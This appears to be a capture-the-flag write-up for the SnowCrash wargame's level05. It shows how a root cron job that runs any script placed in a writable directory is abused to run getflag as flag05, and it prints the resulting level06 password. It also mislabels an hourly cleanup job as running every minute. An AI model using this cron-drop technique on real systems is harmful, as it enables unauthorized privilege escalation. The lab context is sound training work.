# level05

## Cronjobs and init.rc shenanigans

For no reason whatsoever, let's try running this command:
```bash
level05@SnowCrash:~$ grep -R 'flag05' /var
/var/mail/level05:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
/var/spool/mail/level05:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Wow, in an unrelated train of thought, why don't we take a look at `/var/spool/cron/crontabs/root`
```bash
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.zk72ug/crontab installed on Sat Mar  5 20:18:51 2016)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
0 * * * * rm -rf /tmp/* /var/tmp/*
```
Every 2 minutes, `su -c "sh /usr/sbin/openarenaserver" - flag05` is run, executing `sh /usr/sbin/openarenaserver` as `flag05`
Every minute `rm -rf /tmp/* /var/tmp/*` is run.

So, what's inside of `/usr/sbin/openarenaserver`?
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
So this script executes whatever is inside of `/opt/openarenaserver` as a bash script with a limit of 5 seconds of cpu time, before removing it.

So, lets make our own bash script to get our flag
```bash
level05@SnowCrash:~ $ rm -f /tmp/flag; \
> printf '#!/bin/sh\ngetflag>/tmp/flag\n'>/opt/openarenaserver/snjort; \
> chmod +x /opt/openarenaserver/snjort; \
> while true; do if [ -f /tmp/flag ]; then cat /tmp/flag; exit; fi; done
Check flag.Here is your token : viuaaale9huek52boumoomioc
exit
level05@SnowCrash:~ $ su level06
Password: viuaaale9huek52boumoomioc
level06@SnowCrash:~ $ 
```
